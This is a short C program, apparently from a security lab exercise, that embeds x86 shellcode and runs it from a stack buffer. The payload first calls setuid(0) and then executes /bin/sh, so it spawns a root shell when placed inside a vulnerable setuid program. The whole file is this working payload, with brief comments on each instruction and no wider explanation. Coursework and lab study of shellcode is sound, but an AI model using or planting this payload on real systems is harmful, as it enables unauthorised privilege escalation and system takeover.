#include <stdio.h>
#include <stdlib.h>
#include <string.h>

const char code[] =

    //these 4 lines are added -->  setuid(0);

    "\x31\xc0"      /* xorl     %eax, %eax  */
    "\x31\xdb"      /* xorl     %ebx, %ebx  */
    "\xb0\xd5"      /* movb     $0xd5, %al  */
    "\xcd\x80"      /* int      $0x80       */

    //the code below is the same as the call_shellcode

    "\x31\xc0"      /* xorl     %eax, %eax  */
    "\x50"          /* pushl    %eax        */
    "\x68""//sh"    /* pushl    $0x68732f2f */
    "\x68""/bin"    /* pushl    $0x6e69622f */
    "\x89\xe3"      /* movl     %esp, %ebx  */
    "\x50"          /* pushl    %eax        */
    "\x53"          /* pushl    %ebx        */
    "\x89\xe1"      /* movl     %esp, %ecx  */
    "\x99"          /* cdq                  */
    "\xb0\x0b"      /* movb     $0x0b, %al  */
    "\xcd\x80"      /* int      $0x80       */
;

int main(int argc, char *argv[])
{
    char buf[sizeof(code)];
    strcpy(buf, code);
    ((void(*)( ))buf)( );
}